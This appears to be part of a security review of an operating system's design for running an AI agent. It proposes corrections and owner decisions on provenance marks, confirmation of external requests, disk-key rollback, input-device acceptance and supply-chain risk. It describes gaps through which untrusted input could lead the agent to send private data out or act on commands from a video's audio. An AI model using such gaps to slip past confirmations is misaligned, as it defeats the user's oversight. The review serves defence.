**N10. A grant for the rest of a task and a later mark (unsettled case).** `security.md:217`: "only in a task without the `untrusted` mark ... never in a marked task". If the user grants while the task is unmarked and the task is marked afterwards, the text allows both outcomes: the grant survives, or it ends. The contract has the same ambiguity ("for the rest of a task not marked `untrusted`", `actions.wit` line 212). Correction: the grant ends when the task takes the `untrusted` mark.

## Corrections, in order of severity

Each line gives the file, the place, and the exact text. "Insert after" means a new line or bullet after the quoted one.

**1. N1, the source of `private` (breaks a guarantee).**

- `architecture/security.md`, line 186, after "Marks are only ever added; reading data adds its marks to the reading task." insert: "**Where `private` comes from** (Proposed): the storage service adds `private` to every read from the user, application, snapshot and device zones, whatever marks the writer had; `untrusted` follows the writer and the origin. A file that an application saved outside any task has no writer's mark, so without this rule reading the user's files would never mark a task `private`, and the confirmation of an external read in a task marked `private` and `untrusted` would never appear."
- `architecture/kernel-interface.md`, line 1098, after "a record written by a marked call is read back marked, through the added marks of its answer." insert: "The storage service also adds `private` to the answer of every read from the user, application, snapshot and device zones ([security.md](security.md#provenance-marks))."
- For the WIT revision (not edited here): `contracts/core.wit` at `aab7417`, line 170, after "Reading the data adds its marks to the reading task." add: "`private` is set on every read from the user, application, snapshot and device zones, whatever the writer's marks."

**2. N2, the matrix after `invoke` (unsettled case; depends on Q2).** `architecture/security.md`, after line 177, insert: "- **The matrix also holds where data leaves** (Proposed, point 15): the network service refuses an outgoing request from a sender marked both `private` and `untrusted` unless the task service confirmed that call. An action instance can read `home` after the matrix decided at `invoke`; without this rule, untrusted input, private data and an external request can meet inside it unconfirmed." Add point 15 to "Points for the two owners" with the text of Q2.

**3. 3.2, compiled code (breaks a guarantee).**

- `architecture/security.md`, line 27: replace "Every blob is verified on read by its Merkle tree: at reboot, the machine is exactly that hash." with "Every blob of the system zone is verified on read by its Merkle tree against that hash, and every package blob against its signed manifest: at reboot, the system is exactly that hash."
- Line 28, after "cached by component hash, compiler version and instruction set (see [wasm-abi.md](wasm-abi.md#compile-service))." insert: "Compiled code has no signer: each cached entry carries a MAC, under a key kept in the device zone, over the component hash, the compiler version, the instruction set and the root of the code; the runtime checks it before mapping the code and compiles again when it fails (Proposed). Without it, a thief who boots other media can rewrite the cache and its index."

**4. 4.2 and 4.1, the disk key.**

- `architecture/security.md`, line 54, after "so that an update does not break unlocking." insert: "Sealed this way, every image the project ever signed unlocks the disk, including an old one with a known flaw (TCG, TPM 2.0 Part 1, `TPM2_PolicyAuthorize`). Proposed: the policy also requires a minimum version held in a TPM NV index (`TPM2_PolicyAuthorizeNV`, or a counter), raised by each security update. The device zone opens before the session, so its key cannot depend on the user's code: against a thief it is as strong as the signed system that unseals it. The user's code protects the user key, which opens the user and application zones."
- Line 105: replace "User and device zones encrypted, disk key sealed in the TPM with its anti-brute-force mechanism ([Disk key](#disk-key), Proposed);" with "User and device zones encrypted; the user key behind the user's code, protected by the TPM's anti-brute-force mechanism; the device key sealed to the signed system, so readable by whoever can make a signed system misbehave ([Disk key](#disk-key), Proposed);".
- `plan/pending-decisions.md`, P-055, after option B insert: "C. Against the signing key and a minimum version in a TPM NV index raised by security updates. Gives: updates do not break unlocking, and an old signed image no longer unlocks. Costs: one NV index and one write per security update." Recommendation: "C."

**5. Finding 2, direct scanout.**

- `architecture/ui.md`, after line 12, insert: "- Direct scanout stops, and the compositor composes, whenever a system element must be on screen: a confirmation, the secure attention view, the microphone, camera or capture indicator, the agent's surface. It resumes when none is. The latency gate of full-screen WebGPU is measured with no system element shown."
- `architecture/security.md`, line 266, after "and a setting that turns the wake word off" insert: "; whether the detector's mark also stops direct scanout of a full-screen surface is part of [point 6](#points-for-the-two-owners)".

**6. Finding 6, input devices.**

- `architecture/security.md`, line 106: replace "**Not stopped**: a device that types as a keyboard" with "**Not stopped**: a device that types as a keyboard, or points and clicks as a mouse, a touch screen or a tablet".
- Line 327: replace the recommendation with "Recommended: a newly connected input device (keyboard, mouse, touch screen, tablet) is accepted after a key press or a click on a device already accepted, or once the user's code has been typed on it at the lock screen. A device plugged in while the session is locked is not accepted by being plugged in."
- Line 307 (attack 13): after "Keys from a keyboard have origin `user`." insert "So do clicks from a pointing device, which can answer a confirmation once its delay has passed."
- `plan/pending-decisions.md`, P-049: same wording in the question.

**7. 5.1 and N5, kernel replacement.** `architecture/security.md`, line 29, after the line insert: "- A replacement kernel is part of the chain: the slot of kernel image 1 is filled only [by the means the owners choose, Q10], and its SHA-256 is in the fixed part of the machine table (see [kernel-interface.md](kernel-interface.md#start-up-state))." And in `kernel-interface.md`, Open points, add: "**Who fills the replacement slot.** No call writes kernel image 1, and its SHA-256 is recorded in the fixed part at machine start-up; as written, a node can only be replaced by an image shipped in the boot image."

**8. 5.2, N6 and N8, traces and the black box.**

- `architecture/storage.md`, line 38: replace "plus a small raw region for the crash trace." with "plus a small raw region for the crash trace, encrypted with the device key, since the user ring and the black box can hold the user's data."
- `architecture/platform.md`, line 66, after "attached to the crash report." insert: "The report is stored in the user zone, and reading it marks the reading task with the marks of the messages it holds."
- `architecture/kernel-interface.md`, line 1072, after "the bits of a notify (`signal`, interrupts, timers)," insert "the user trace ring, whose entries record their writer's marks but which a reader of the crash area reads without a stamp (the log service must store them with those marks),".

**9. 7.1, 7.2, 7.3, web.**

- `architecture/security.md`, line 135: replace "web content processes," with "web content processes and Ladybird's helpers that serve one site (RequestServer, ImageDecoder, AudioServer),". Insert after line 127: "7 bis. Ladybird's Hub: it holds the cookies, web storage and permissions of every site, and it is not sandboxed ([Ladybird's process architecture](https://github.com/LadybirdBrowser/ladybird/blob/master/Documentation/ProcessArchitecture.md), read 16 November 2026)."
- `architecture/web.md`, line 31, after "with a fixed "web world"." insert: "A site is a scheme and a registrable domain; provenance names the origin."
- `plan/pending-decisions.md`, P-052, after the question add: "Whatever the answer, a web application that holds WIT interfaces runs without the JIT."

**10. N7, the GPU stack.** `architecture/security.md`, line 121: replace "processor, memory, TPM (the Intel fTPM of the desktop), IOMMU." with "processor, memory, TPM (the Intel fTPM of the desktop), IOMMU, and the GPU's GSP firmware." Insert after line 127: "7 ter. The GPU service, the project's glue of the NVIDIA core and its NVK back end: they draw the trusted path with the compositor, and they keep one GPU client's memory from another's ([gpu.md](gpu.md#gpu-memory))."

**11. 8.2, memory and label creep.** `architecture/security.md`, line 279, after "marks die with the task, and each request is a new task" insert: "(except through the agent's memory: an entry keeps the marks of the task that wrote it, so a task that recalls it is marked again; the user's lever is `forget`)".

**12. N3, scenario 10.** `architecture/security.md`, line 304: replace "Echo cancellation subtracts what the machine plays, and the recogniser drops a request that matches its own output (P). **Stops at** the audio path, by filtering, not by proof." with "Echo cancellation subtracts what the machine plays. The recogniser's comparison (P) covers only what the system itself spoke, not a video's sound. **Stops at** echo cancellation, by filtering, not by proof." Line 268: after "drops a request whose text matches what the machine spoke in the last seconds" insert ", allowing for recognition errors".

**13. 3.1, the order of keys at boot.** `architecture/storage.md`, after line 61, insert: "- Start-up order: the boot image reads the system zone, which is not encrypted; the service manager starts the TPM driver and the key service from it; the key service unseals the device key and opens the device zone; the user's code then opens the user key."

**14. 3.3, shared code pages.** `architecture/security.md`, line 339, after the line insert: "- Compiled code and native programs are shared between publishers by hash (Decided, [memory.md](memory.md#paging-in-user-space)), which leaves a cache side channel on shared code (Flush+Reload type) to native code with a fine clock. Accepted; a component that needs to hide its control flow is compiled into pages of its own."

**15. N10, the grant.** `architecture/security.md`, line 217, after "never in a marked task." insert "A grant ends when its task takes the `untrusted` mark."

**16. 12.1, Wasmtime on ARM64.** `architecture/security.md`, line 340: replace "The Spectre protections of Wasmtime are active." with "The Spectre protections of Wasmtime are active; on ARM64 this needs the Cranelift setting `use_csdb`, off by default (Wasmtime, Security, read 16 November 2026). Winch's coverage is to verify."

**17. 12.2, UEFI.** `architecture/security.md`, line 60: replace "A Microsoft-signed loader for a non-Linux OS is not verified." with "Microsoft does not sign code under GPLv3 or any licence that gives a right to the keys needed to install modified code (Microsoft, Updated UEFI Signing Requirements, read 16 November 2026); so the intermediate loader cannot be under AGPLv3 (D-014) and must load the system with the project's key, as shim loads GRUB 2. Whether Microsoft signs such a loader for a non-Linux OS is not verified."

**18. 9.1, the supply chain.** `architecture/security.md`, after line 108, insert the row: "| Compromised dependency or build | A dependency, an upstream port, a firmware blob or CI changed so that an honest threshold signs a hostile image | Reproducible build, pinned inputs and supply-chain checks ([verification.md](../plan/verification.md#checks-per-stage), Open); human review in the contract lane (D-032). **Not stopped** today: a dependency PR of the maintenance lane merges when the checks pass (D-032) |".

**19. 10.1 and 10.2, physical.** `architecture/security.md`, line 105, after "a locked session runs no task on user data ([Speech](#speech), Proposed)." insert: "Which applications are installed is visible on the disk (P-060). DMA before the kernel turns the IOMMU on is left to the firmware's protection, a property of the first stage like secure boot."

**20. 14 (point 1), redirects.** `architecture/security.md`, line 178, after "and only to the hosts its manifest lists for that action." insert "The network service follows no redirect for an action instance; each request is checked."

**21. 14 (point 4).** `architecture/security.md`, line 107: replace "the task identifier and marks it stamps on the messages it sends to other nodes" with "the marks, and the task identifier among its own node's tasks, that it stamps on the messages it sends to other nodes (the receiving kernel refuses an identifier of another node)".

**22. 1.2, applications and sticky marks.** `architecture/kernel-interface.md`, line 1099: replace "**Applications** are not concerned: an agent action runs in a fresh instance (see [agent.md](agent.md))." with "**Applications**: an agent action runs in a fresh instance (see [agent.md](agent.md)), but the long-lived instance of an application takes the marks of the records an action wrote while marked, when it reads them, until it is restarted." And in P-058: replace "how many services end up marked" with "how many services and long-lived applications end up marked".

**23. 12.3, RMRR and SATC.** `architecture/kernel-interface.md`, Open points, add: "**Reserved regions and required ATS.** The kernel reads only the DRHD entries; the RMRR entries are read by the platform service and handed to the driver manager, which maps them into the driver's iospace (rule of [IOMMU](#iommu)). A device that a SATC entry flags as requiring ATS does not work, since the kernel enables no ATS."

**24. N4, CaMeL.** `architecture/security.md`, line 283: replace "(section 5.4)" with "(section 6.4)". Line 156: after "Debenedetti et al., [CaMeL](https://arxiv.org/abs/2503.18813) (arXiv 2503.18813" insert ", version 2 of 24 June 2025".

**25. 15, the WIT baseline.** `architecture/security.md`, line 356, after "Lines are those of that commit." insert: "The Step 0 revision (`aab7417`, pull request 1) answers most rows; the next revision of this page marks which."

## Questions only the two owners can settle

**Q1. Do you accept that `private` comes from the zone, not the writer (N1)?** A: every read from the user, application, snapshot and device zones adds `private`. B: only data written by a marked task is private, as the kernel does today. Costs of A: more tasks are `private`, so more external reads after an untrusted read are confirmed. Costs of B: the confirmation D-036 relies on almost never fires. Recommendation: A. It is what attack 1 already assumes.

**Q2. Where is the matrix's external-read cell enforced (N2)?** A: also at the network service, per request, on the sender's marks. B: at `invoke` only, stating the limit: an action instance may combine untrusted input, its `home` and a request to its declared hosts. C: no `home` for `none, external` instances. Costs: A, one check per request in a mark-aware service, and a confirmation path from the network service to the task service; B, a known hole; C, breaks every action that authenticates with a token stored in `home`. Recommendation: A.

**Q3. Anti-rollback for the disk key (4.2).** A: as P-055 option A. B: P-055 option B (against the hash). C: signing key plus a minimum version in an NV index. Recommendation: C.

**Q4. Direct scanout and system elements (Finding 2).** A: scanout stops whenever any system element shows, including the detector's mark, so no direct scanout while the wake word is on. B: scanout stops for confirmations, the secure attention view and the full microphone, camera and capture indicators, but not for the detector's discreet mark. C: system elements on a hardware plane above the scanout plane, if the GPU trial shows planes (`gpu.md:33`, from memory). Recommendation: B now, C if the trial confirms planes.

**Q5. Which new input devices need acceptance (Finding 6)?** A: every device that can give origin `user` (keyboard, mouse, touch screen, tablet). B: keyboards only, as point 12. Costs of A: friction when a mouse is replaced; a first device must be accepted at installation. Recommendation: A, with the safe reading of "at the lock screen" (the code typed on it).

**Q6. Local models from third parties (point 3).** A: as recommended, remote models only, the local residual stated in row 104. B: every task counts as `untrusted` for the matrix from its first token, whatever the model. C: local weights not signed by the project count as remote. Costs of B: with Q1, almost every external read is confirmed. Recommendation: A, with the residual written in point 3, revisited with the injection suite's counts.

**Q7. The wake word's default (point 6).** A: on by default, with the mark. B: off by default, the key only, voice on request. B touches the Aligned line "Voice detection is always active" (`agent.md:11`). Recommendation: A; it is a product choice, but B should be listed as the alternative.

**Q8. Dependency changes in the maintenance lane (9.1).** A: as D-032, they merge when the checks pass. B: a change to what ships in a signed image (lockfiles, vcpkg ports, Nix pins, firmware blobs, build scripts) needs the review of another model family, as the function lane. C: it goes to the contract lane. Recommendation: B; it reopens D-032 for that one case.

**Q9. The JIT for web applications that hold WIT interfaces (7.3).** A: they follow P-052's answer. B: never a JIT for them, whatever P-052 says. Recommendation: B.

**Q10. Who fills the replacement kernel slot (5.1, N5)?** A: image 1 comes only in the signed boot image; an update without reboot moves only to a shipped image. B: a call of the supervisor fills the slot with an image that the supervisor verified by TUF, the kernel checking only that the bytes match the SHA-256 given; the chain then rests on the supervisor, and the TPM's measurements do not see the new kernel. Recommendation: B for the server image, stated in the chain of trust with its limit on measurement.

**Q11. The scope of a new task (point 14).** A: everything minus exclusions (P-040, A). B: a router. C: the open surfaces and the applications the request names. Costs of C: "do X" with an application that is not open needs the user to name it. Recommendation: A for version 1, with C as the alternative written in P-040, since the matrix, not the scope, carries the protection.

## What I checked, and what I did not

Checked at the source, today:
- Every quote of the fifteen findings, at the cited lines of `Docs` `c93a623`.
- The step0 contracts (`aab7417`): `core.wit` lines 150-175 and 250-290, `actions.wit` lines 180-225, `agent.wit` lines 20-60 and 136-220, the grep of `manifest.wit`.
- CaMeL, arXiv 2503.18813 v1 and v2 (headings and sections 3, 3.1, 9.2 of v2); the abstract page's submission history.
- Wasmtime, "Security" and "Tiers of Support" pages; Zulip archive of PR #12930.
- Microsoft, "Updated UEFI Signing Requirements" (Tech Community).
- Linux `include/acpi/actbl1.h` and `drivers/iommu/intel/iommu.c` on `master`.
- TCG, TPM 2.0 Library Part 1, revision 1.59, sections 19.8 and the `PolicyAuthorize` section.
- Ladybird, `Documentation/ProcessArchitecture.md` on `master`.

Not checked: the RTBAS, FIDES and IsolateGPT sections and the Meta text (the review says they match; I did not re-read them); the expiry date of Microsoft's 2011 CA (from memory); whether AGPLv3 carries GPLv3's installation-information clause (from memory: it does, section 6); Winch's `br_table` and 64-bit bounds-check mitigations; the GitHub rulesets of the three repositories; the `catalog.wit` rows of `security.md:372-373` in `aab7417`; whether Ladybird's `master` matches commit `c8b525e` on process layout.
